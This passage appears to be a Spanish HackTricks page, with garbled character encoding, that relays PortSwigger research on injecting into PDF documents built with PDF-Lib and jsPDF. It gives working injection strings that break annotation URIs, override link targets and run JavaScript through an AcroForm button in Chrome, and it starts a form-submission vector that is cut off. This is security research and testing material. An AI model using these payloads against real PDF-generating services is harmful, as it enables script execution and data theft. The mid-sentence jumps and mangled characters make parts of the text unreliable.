<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Si tu entrada se refleja dentro de un archivo PDF, puedes intentar inyectar datos PDF para ejecutar JavaScript o robar el contenido del PDF.**

La siguiente informaciÃ³n fue tomada de [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

Esta vez, estaba usando [PDFLib](https://pdf-lib.js.org). Me tomÃ© un tiempo para usar la biblioteca para crear una anotaciÃ³n y ver si podÃ­a inyectar un parÃ©ntesis de cierre en la URI de la anotaciÃ³n, Â¡y funcionÃ³! El cÃ³digo vulnerable de muestra que utilicÃ© para generar el cÃ³digo de anotaciÃ³n fue:

`...`  \
`A: {`\
    `Type: 'Action',`\
    `S: 'URI',`\
    ``URI: PDFString.of(`injection)`),``\
  `}`\
  `})`\
`...`

[CÃ³digo completo:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

Â¿CÃ³mo supe que la inyecciÃ³n fue exitosa? El PDF se renderizarÃ­a correctamente a menos que inyectara un parÃ©ntesis de cierre. Esto demostrÃ³ que el parÃ©ntesis de cierre estaba rompiendo la cadena y causando cÃ³digo PDF no vÃ¡lido. Romper el PDF fue bueno, pero necesitaba asegurarme de que podÃ­a ejecutar JavaScript, por supuesto. MirÃ© el cÃ³digo PDF renderizado y notÃ© que la salida estaba siendo codificada usando el filtro FlateDecode. EscribÃ­ un pequeÃ±o script para desinflar el bloque y la salida de la secciÃ³n de anotaciÃ³n se veÃ­a asÃ­:`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

Como se puede ver claramente, la cadena de inyecciÃ³n estÃ¡ cerrando el lÃ­mite de texto con un parÃ©ntesis de cierre, lo que deja un parÃ©ntesis de cierre existente que hace que el PDF se renderice incorrectamente:

![Captura de pantalla que muestra un cuadro de diÃ¡logo de error al cargar el PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

Genial, asÃ­ que pude romper la renderizaciÃ³n del PDF, Â¿y ahora quÃ©? Necesitaba idear una inyecciÃ³n que llamara a algÃºn JavaScript, la alerta(1) de la inyecciÃ³n PDF.

Al igual que los vectores XSS dependen del anÃ¡lisis del navegador, la explotabilidad de la inyecciÃ³n PDF puede depender del renderizador PDF. DecidÃ­ comenzar apuntando a Acrobat porque pensÃ© que los vectores er
## Chrome

He hablado mucho sobre Acrobat, pero Â¿quÃ© hay de PDFium (lector de PDF de Chrome)? Chrome es complicado; la superficie de ataque es mucho mÃ¡s pequeÃ±a ya que su soporte de JavaScript es mÃ¡s limitado que el de Acrobat. Lo primero que notÃ© fue que JavaScript no se estaba ejecutando en las anotaciones en absoluto, por lo que mis pruebas de concepto no funcionaban. Para hacer que los vectores funcionen en Chrome, necesitaba al menos ejecutar JavaScript dentro de las anotaciones. Primero, decidÃ­ intentar sobrescribir una URL en una anotaciÃ³n. Esto fue bastante fÃ¡cil. PodÃ­a usar la inyecciÃ³n base que habÃ­a creado antes e inyectar simplemente otra acciÃ³n con una entrada URI que sobrescribirÃ­a la URL existente: `var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

Esto navegarÃ­a a portswigger.net cuando se hace clic. Luego, seguÃ­ intentando diferentes inyecciones para llamar a JavaScript, pero esto fallarÃ­a cada vez. PensÃ© que era imposible hacerlo. Di un paso atrÃ¡s e intentÃ© construir manualmente un PDF completo que llamara a JavaScript desde un clic en Chrome sin una inyecciÃ³n. Al usar un botÃ³n AcroForm, Chrome permitirÃ­a la ejecuciÃ³n de JavaScript, pero el problema era que requerÃ­a referencias a partes del PDF. LogrÃ© crear una inyecciÃ³n que ejecutarÃ­a JavaScript desde un clic en JSPDF: `var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

Como puede ver, el vector anterior requiere conocimiento de la estructura PDF. `[ 3 0 R]` se refiere a un objeto PDF especÃ­fico y si estuviÃ©ramos haciendo un ataque de inyecciÃ³n de PDF ciego, no conocerÃ­amos su estructura. AÃºn asÃ­, la siguiente etapa es intentar una presentaciÃ³n de formulario. Podemos usar la funciÃ³n `submitForm` para esto, y como la anotaciÃ³n requiere un clic, Chrome lo permitirÃ¡: `/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Sub
